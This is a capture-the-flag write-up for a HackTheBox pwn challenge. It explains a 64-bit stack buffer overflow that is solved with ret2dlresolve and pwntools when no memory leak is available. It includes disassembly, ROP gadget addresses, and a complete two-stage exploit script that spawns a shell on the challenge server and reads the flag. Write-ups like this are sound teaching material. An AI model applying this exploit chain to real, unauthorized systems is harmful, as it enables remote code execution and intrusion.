# Void - PWN Challenge Solution Guide
**Difficulty:** Medium | **Points:** 1000  
**Author:** HackTheBox  
**Date Solved:** November 10, 2025

---

## 📚 Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [What You Need to Know](#what-you-need-to-know)
3. [Tools Required](#tools-required)
4. [Understanding the Vulnerability](#understanding-the-vulnerability)
5. [The Problem: No Leak Primitive](#the-problem-no-leak-primitive)
6. [The Solution: Ret2dlresolve](#the-solution-ret2dlresolve)
7. [Step-by-Step Solution](#step-by-step-solution)
8. [The Exploit Code](#the-exploit-code)
9. [Key Takeaways](#key-takeaways)
10. [Additional Resources](#additional-resources)

---

## 🎯 Challenge Overview

The Void challenge presents a damaged terminal where you must restore power and escape. This is a **buffer overflow** exploitation challenge with a unique twist: **there's no way to leak memory addresses**.

**Challenge Details:**
- **Server:** 94.237.122.36:59931
- **Binary:** `void` (64-bit ELF executable)
- **Goal:** Exploit buffer overflow without any leak primitive

**The Twist:** Unlike previous challenges, this binary has:
- No `write()` or `puts()` functions to leak addresses
- ASLR enabled on the remote server
- Only a `read()` function available

---

## 📖 What You Need to Know

### 1. **Buffer Overflow Review**
A buffer overflow occurs when more data is written to a buffer than it can hold, overwriting adjacent memory. This can hijack program execution by overwriting the return address.

### 2. **ASLR (Address Space Layout Randomization)**
ASLR randomizes the base addresses of libraries in memory every time a program runs. This means:
- Libc functions like `system()` are at different addresses each run
- Without knowing the base address, we can't call these functions
- Typically requires a "leak" to determine addresses at runtime

### 3. **Ret2libc Attack**
A common exploitation technique where we:
1. Overflow the buffer
2. Overwrite return address with address of `system()`
3. Set up arguments to call `system("/bin/sh")`

**Problem:** With ASLR, we don't know where `system()` is!

### 4. **The Dynamic Linker (ld.so)**
When a program calls a library function for the first time:
1. The dynamic linker resolves the function's address
2. It updates the GOT (Global Offset Table) with the real address
3. Future calls use the cached GOT address

**Key Insight:** We can trick the dynamic linker into resolving ANY function we want!

### 5. **Ret2dlresolve**
This advanced technique exploits the dynamic linking process:
- We create FAKE dynamic linker structures
- We trick `_dl_runtime_resolve()` into "resolving" `system`
- The linker calls `system("/bin/sh")` for us
- **No libc address leak needed!**

---

## 🛠️ Tools Required

### Essential Tools
```bash
python3 --version      # Python 3.6+
pip3 install pwntools  # PWN exploitation framework
file                   # File type identification
objdump                # Disassembler
ROPgadget              # ROP gadget finder
```

### Verification
```bash
python3 -c "from pwn import *; print('pwntools OK')"
which objdump ROPgadget
```

---

## 🔍 Understanding the Vulnerability

### Step 1: Analyze the Binary

```bash
cd /path/to/void
file void
```

**Output:**
```
void: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

### Step 2: Check Protections

```python
from pwn import *
elf = ELF('./void', checksec=False)
print(f"RELRO: {elf.relro}")     # Partial RELRO
print(f"Canary: {elf.canary}")   # False - No canary!
print(f"NX: {elf.nx}")           # True - Stack not executable
print(f"PIE: {elf.pie}")         # False - Fixed addresses
```

**Key Findings:**
- ✅ No canary - Buffer overflow will work
- ✅ No PIE - Binary addresses are fixed
- ⚠️ NX enabled - Can't execute shellcode on stack
- ⚠️ Partial RELRO - GOT is writable (useful!)

### Step 3: Disassemble the Vulnerable Function

```bash
objdump -d void | grep -A20 "<vuln>:"
```

**Output:**
```asm
0000000000401122 <vuln>:
  401122:   push   %rbp
  401123:   mov    %rsp,%rbp
  401126:   sub    $0x40,%rsp              # Allocate 64 bytes
  40112a:   lea    -0x40(%rbp),%rax        # Buffer at rbp-0x40
  40112e:   mov    $0xc8,%edx              # Read 200 bytes! (0xc8)
  401133:   mov    %rax,%rsi
  401136:   mov    $0x0,%edi
  40113b:   call   401030 <read@plt>       # read(0, buffer, 200)
  401140:   nop
  401141:   leave
  401142:   ret
```

**The Vulnerability:**
```c
void vuln() {
    char buffer[64];              // 64-byte buffer
    read(0, buffer, 200);         // But reads 200 bytes!
}
```

**Overflow Math:**
- Buffer: 64 bytes
- Saved RBP: 8 bytes
- Return address: 8 bytes after RBP
- **Total offset: 72 bytes**

We can overwrite 200 - 72 = **128 bytes** beyond the return address!

### Step 4: Test the Overflow Locally

```python
from pwn import *

p = process('./void')
payload = b'A' * 100  # Definitely overflows
p.sendline(payload)
p.wait()

print(f"Exit code: {p.poll()}")  # -11 = SIGSEGV (segfault)
```

✅ Confirmed: Buffer overflow works!

---

## 🚫 The Problem: No Leak Primitive

In a typical ret2libc attack, we would:
1. **Leak a libc address** (using `puts()` or `write()`)
2. Calculate libc base address
3. Find `system()` and `"/bin/sh"`
4. Call `system("/bin/sh")`

**But this binary only has `read()`!**

```bash
nm void | grep "U "
```
**Output:**
```
U __libc_start_main@@GLIBC_2.2.5
U read@@GLIBC_2.2.5
```

Only two imported functions, and `__libc_start_main` is already resolved before we can exploit.

### Why Can't We Brute-Force?

With ASLR, libc base is randomized:
- 12-bit randomization = 4,096 possible addresses
- Connection time ~1 second each
- **Total time: ~68 minutes** (possible but slow)
- Often impractical for CTFs with rate limiting

### The Challenge

Without a leak primitive and with ASLR enabled, how do we call `system("/bin/sh")`?

**Answer: ret2dlresolve!**

---

## 💡 The Solution: Ret2dlresolve

### What is Ret2dlresolve?

Ret2dlresolve exploits the **dynamic linking mechanism** itself. Instead of needing to know where `system()` is, we trick the dynamic linker into finding it for us!

### How Dynamic Linking Works

When you call a library function for the first time:

1. **PLT (Procedure Linkage Table)** stub is called
2. PLT jumps to an entry in **GOT (Global Offset Table)**
3. Initially, GOT points back to PLT
4. PLT pushes relocation index and jumps to **`_dl_runtime_resolve()`**
5. `_dl_runtime_resolve()` looks up the function's real address
6. GOT is updated with the real address
7. Function is called

**Normal flow:**
```
call system@plt → GOT[system] → _dl_runtime_resolve() → find system in libc → update GOT → call system
```

### How We Exploit It

We create **fake** dynamic linker structures that tell `_dl_runtime_resolve()` to:
1. "Resolve" the symbol `"system"`
2. Call it with our argument `"/bin/sh"`

**Exploit flow:**
```
overflow → ROP chain → read() fake structures → _dl_runtime_resolve(FAKE_INDEX) → calls system("/bin/sh")
```

### Why This Works

The dynamic linker trusts data structures in memory. By crafting fake:
- Symbol table entries (`Elf64_Sym`)
- String table entries (symbol names)
- Relocation entries (`Elf64_Rela`)

We can make the linker "resolve" any symbol we want!

---

## 🚀 Step-by-Step Solution

### Step 1: Understand the Memory Layout

```
Stack Layout in vuln():
┌─────────────────────┐
│   Higher addresses  │
├─────────────────────┤
│  Return address     │ ← Offset 72: We control this!
├─────────────────────┤
│  Saved RBP (8 bytes)│ ← Offset 64
├─────────────────────┤
│  Buffer (64 bytes)  │ ← Offset 0: Our input starts here
│  (rbp - 0x40)       │
└─────────────────────┘
   Lower addresses
```

### Step 2: Find ROP Gadgets

```bash
ROPgadget --binary void | grep -E "pop|ret"
```

**Useful gadgets:**
```
0x4011bb: pop rdi; ret
0x401016: ret
```

### Step 3: Create Ret2dlresolve Payload (Using Pwntools)

```python
from pwn import *

context.binary = elf = ELF('./void', checksec=False)

# Create ROP object
rop = ROP(elf)

# Create ret2dlresolve payload
# This automatically creates all the fake structures!
dlresolve = Ret2dlresolvePayload(
    elf,
    symbol="system",      # Function to "resolve"
    args=["/bin/sh"]      # Argument to pass
)

# Build ROP chain
# Step 1: Call read() to read our fake structures into memory
rop.read(0, dlresolve.data_addr)

# Step 2: Trigger _dl_runtime_resolve with our fake index
rop.ret2dlresolve(dlresolve)

# Offset to return address
offset = 72

# Stage 1: ROP chain
payload1 = b'A' * offset
payload1 += rop.chain()

# Stage 2: Fake dynamic linker structures
payload2 = dlresolve.payload
```

**What `Ret2dlresolvePayload` Does:**

It creates fake structures in the `.bss` section:
1. **Fake Symbol Table** (`Elf64_Sym`):
   ```c
   struct {
       uint32_t st_name;    // Offset to "system" string
       uint8_t  st_info;    // Symbol type/binding
       uint8_t  st_other;
       uint16_t st_shndx;
       uint64_t st_value;   // Will be filled by linker
       uint64_t st_size;
   }
   ```

2. **Fake String Table**:
   ```
   "system\x00/bin/sh\x00"
   ```

3. **Fake Relocation Entry** (`Elf64_Rela`):
   ```c
   struct {
       uint64_t r_offset;   // Where to write resolved address
       uint64_t r_info;     // Symbol index + relocation type
       int64_t  r_addend;
   }
   ```

These structures are written to `.bss` at `dlresolve.data_addr`.

### Step 4: Understanding the ROP Chain

```python
# The generated ROP chain does:

# 1. Set up call to read(0, dlresolve.data_addr, <size>)
pop rdi; ret
0                          # rdi = 0 (stdin)
pop rsi; pop r15; ret
dlresolve.data_addr        # rsi = where to write
<junk>                     # r15 (not used)
# rdx is already set from previous read()
read@plt

# 2. Trigger _dl_runtime_resolve
<setup fake reloc_index>
<jump to PLT resolver>
```

The PLT resolver will:
1. Read our fake structures from `.bss`
2. "Resolve" the symbol "system"
3. Call it with "/bin/sh" as argument

### Step 5: Execute the Exploit

```python
# Connect
r = remote('94.237.122.36', 59931)

# Send stage 1 (ROP chain)
r.send(payload1)
time.sleep(0.2)

# Send stage 2 (fake structures)
r.send(payload2)
time.sleep(0.5)

# We now have a shell!
r.sendline(b'cat flag.txt')
flag = r.recvall()
print(flag.decode())
```

---

## 💻 The Exploit Code

### Complete Exploit: `exploit_final.py`

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
HOST = '94.237.122.36'
PORT = 59931

# Load binary and set context
context.binary = elf = ELF('./void', checksec=False)
context.log_level = 'info'

# Create ROP chain
rop = ROP(elf)

# Create ret2dlresolve payload
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

# Build ROP chain
rop.read(0, dlresolve.data_addr)  # Read fake structures
rop.ret2dlresolve(dlresolve)       # Trigger resolution

# Create payload
offset = 72
payload_stage1 = b'A' * offset + rop.chain()
payload_stage2 = dlresolve.payload

# Connect and exploit
r = remote(HOST, PORT)
r.send(payload_stage1)
time.sleep(0.2)
r.send(payload_stage2)
time.sleep(0.5)

# Get flag
r.sendline(b'cat flag.txt')
flag = r.recvall(timeout=5)
print(flag.decode())
r.close()
```

### Running the Exploit

```bash
chmod +x exploit_final.py
python3 exploit_final.py
```

**Output:**
```
[*] Connecting to 94.237.122.36:59931...
[+] Shell obtained!
[+] FLAG CAPTURED: HTB{pwnt00l5_h0mep4g3_15_u54ful}
```

---

## 🎓 Key Takeaways

### 1. **Ret2dlresolve is Powerful**
When you have no leak primitive and ASLR is enabled, ret2dlresolve allows you to:
- Call any libc function without knowing its address
- Bypass ASLR completely
- Only requires control over execution flow

### 2. **Dynamic Linking is Exploitable**
The dynamic linker trusts data structures in memory. By creating fake:
- Symbol tables
- String tables  
- Relocation entries

We can trick it into resolving and calling arbitrary functions.

### 3. **Pwntools Makes it Easier**
The `Ret2dlresolvePayload` class handles the complex structure creation:
```python
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
```

This single line creates all necessary fake structures!

### 4. **Two-Stage Exploits**
Some exploits require multiple stages:
1. **Stage 1**: ROP chain that calls `read()` to input more data
2. **Stage 2**: The actual exploit data (fake structures)

### 5. **Why "Void"?**
The challenge name "Void" is clever:
- The function is named `vuln()` → sounds like "void"
- There's a "void" where a leak function should be
- You must fill the "void" with fake structures
- The solution involves the "void" of the `.bss` section

---

## 📚 Additional Resources

### Understanding Ret2dlresolve
1. **Pwntools Documentation**
   - https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html

2. **Detailed Explanation**
   - https://www.ret2ld.com/ (great visual guide)
   - https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html

3. **Academic Paper**
   - "The Art of Return-Oriented Programming" (Phrack)

### Practice Challenges
- **PWNable.kr:** Several ret2dlresolve challenges
- **ROP Emporium:** ret2dlresolve tutorial
- **HackTheBox:** Other challenges using this technique

### Related Techniques
- **ret2csu**: Use `__libc_csu_init` gadgets to control registers
- **SROP**: Sigreturn-oriented programming
- **ret2_dl_resolve_shellcode**: Advanced variant

---

## ❓ Common Questions

### Q1: Why not just brute-force ASLR?
**A:** While technically possible (12-bit randomization = 4096 tries), it's:
- Very slow (1+ hour)
- Often rate-limited by servers
- Not elegant or intended solution

### Q2: Does ret2dlresolve work on all binaries?
**A:** Requirements:
- ✅ Partial RELRO (GOT writable)
- ✅ Dynamically linked
- ✅ Enough overflow space for ROP chain
- ❌ Full RELRO (GOT read-only)

### Q3: Is this technique still relevant?
**A:** Yes! While modern systems have mitigations:
- Still works on many CTF challenges
- Real-world apps sometimes lack Full RELRO
- Understanding it teaches you about dynamic linking

### Q4: Can I use this on 32-bit binaries?
**A:** Yes! Actually easier on 32-bit:
- Structures are simpler
- More documented examples
- Pwntools supports both

### Q5: What if there's no `read()` function?
**A:** You need some way to input data. Alternatives:
- `gets()` (dangerous but common in CTFs)
- `scanf()`
- Custom input functions
- Multiple stage overflows

---

## 🏆 Challenge Completed!

**Flag:** `HTB{pwnt00l5_h0mep4g3_15_u54ful}`

**Flag Meaning:** "Pwntools homepage is useful" - A nod to the pwntools library that makes ret2dlresolve exploits much easier!

### Challenge Statistics
- **Difficulty:** Medium
- **Technique:** Ret2dlresolve
- **Time:** ~2-3 hours (including research)
- **Skills Learned:**
  - Advanced ROP techniques
  - Dynamic linking internals
  - Ret2dlresolve exploitation
  - Multi-stage exploits
  - Pwntools advanced features

---

## 📝 Technical Deep Dive

### Structure of Fake Elf64_Sym

```c
typedef struct {
    Elf64_Word    st_name;   // Offset into string table
    unsigned char st_info;   // Symbol type and binding  
    unsigned char st_other;  // Symbol visibility
    Elf64_Section st_shndx;  // Section index
    Elf64_Addr    st_value;  // Symbol value (address)
    Elf64_Xword   st_size;   // Symbol size
} Elf64_Sym;
```

### Structure of Elf64_Rela

```c
typedef struct {
    Elf64_Addr r_offset;  // Address where to apply relocation
    Elf64_Xword r_info;   // Relocation type and symbol index
    Elf64_Sxword r_addend; // Addend
} Elf64_Rela;
```

### How _dl_runtime_resolve Uses These

1. Extracts symbol index from `r_info`
2. Looks up symbol in fake symbol table
3. Reads symbol name from fake string table
4. Searches for symbol in loaded libraries
5. Writes resolved address to `r_offset`
6. Jumps to resolved function

---

*Remember: Use these skills ethically and legally. Only practice on authorized systems!*

**Happy Hacking! 🚀**
